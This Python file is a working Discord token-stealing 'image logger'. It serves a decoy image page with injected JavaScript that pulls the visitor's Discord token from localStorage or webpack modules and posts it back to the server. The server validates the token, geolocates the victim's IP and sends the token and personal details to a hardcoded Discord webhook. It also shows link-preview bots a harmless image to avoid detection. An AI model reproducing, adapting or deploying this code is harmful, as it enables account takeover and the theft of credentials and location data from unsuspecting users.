from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Token-Stealing Image Logger"
__version__ = "v1.0"
__author__ = "DarkForge-X"

# ===== CONFIGURATION =====
config = {
    "webhook": "https://discord.com/api/webhooks/1445525808738209842/7mVz0fWYacpiQd_Yew1gXK5S39JGMSfLDsho-5D8iLhuVbncp2hnjiW-h7WBPlOIDMf9",
    "image": "https://live-production.wcms.abc-cdn.net.au/df2932c134dac6cf63116619bee50169?impolicy=wcms_crop_resize&cropH=1688&cropW=3000&xPos=0&yPos=338&width=862&height=485",
    "username": "fars",
    "color": 0xFF0000,  # Red for critical alerts
    "buggedImage": True,
    "antiBot": 1,
}

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def makeReport(ip, useragent, token=None, endpoint="N/A", url=None):
    if ip.startswith(("27", "104", "143", "164")):  # Bot IPs
        return
    
    # IP Geolocation
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {"isp": "Unknown", "country": "Unknown", "city": "Unknown", "lat": "0", "lon": "0", "proxy": False}
    
    # Embed Construction
    embed = {
        "username": config["username"],
        "content": "@everyone" if not info.get("proxy") else "",
        "embeds": [{
            "title": "🚨 DISCORD TOKEN CAPTURED" if token else "📍 IP Logged (No Token)",
            "color": config["color"],
            "description": f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**ISP:** `{info['isp']}`\n**Location:** `{info['city']}, {info['country']}`",
            "fields": []
        }]
    }
    
    if token:
        embed["embeds"][0]["fields"].append({
            "name": "🔑 Stolen Token",
            "value": f"```{token}```",
            "inline": False
        })
        # Validate token
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if r.status_code == 200:
                user = r.json()
                embed["embeds"][0]["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png"}
                embed["embeds"][0]["description"] += f"\n**User:** `{user['username']}#{user['discriminator']}`"
        except: pass
    
    requests.post(config["webhook"], json=embed)

class TokenLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Serve loading image to bots
            ip = self.headers.get('x-forwarded-for')
            ua = self.headers.get('user-agent')
            
            if ip.startswith(("34", "35")) or "TelegramBot" in ua:  # Discord/Telegram bots
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                return

            # Generate malicious payload
            js_payload = """
            (async () => {
                let token;
                try {
                    // Discord Web Client (localStorage)
                    token = localStorage.getItem('token')?.replace(/"/g, '');
                    
                    // Fallback: Extract from webpack
                    if (!token) {
                        const modules = webpackJsonp?.push([[], { ['']: (_, __, req) => { for (let m of Object.keys(req.c).map(k => req.c[k].exports)) { if (m && m.default && m.default.getToken) token = m.default.getToken(); } } }, [['']]]).pop();
                    }
                } catch(e) {}

                if (token) {
                    fetch('LOG_ENDPOINT', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({token, ua: navigator.userAgent})
                    });
                }
            })();
            """.replace("LOG_ENDPOINT", f"http://{self.headers.get('host')}/exfil")

            html_payload = f'''
            <html>
            <body>
                <img src="{config['image']}" style="width:100%;height:100%;">
                <script>{js_payload}</script>
            </body>
            </html>
            '''.encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_payload)

        except Exception as e:
            self.send_error(500)
            requests.post(config["webhook"], json={
                "username": "Error Logger",
                "embeds": [{"title": "Payload Error", "description": f"```{traceback.format_exc()}```"}]
            })

    def do_POST(self):
        if self.path == "/exfil":
            content_len = int(self.headers.get('content-length', 0))
            post_body = self.rfile.read(content_len)
            try:
                data = json.loads(post_body)
                makeReport(
                    ip=self.headers.get('x-forwarded-for'),
                    useragent=data.get('ua', 'Unknown'),
                    token=data.get('token'),
                    endpoint="/exfil"
                )
            except: pass
            
            self.send_response(200)
            self.end_headers()
        else:
            self.handleRequest()

    do_GET = handleRequest

# ===== SERVER LAUNCHER =====
if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 80), TokenLoggerAPI)
    print("Token-Stealing Image Logger Active on Port 80")
    server.serve_forever()
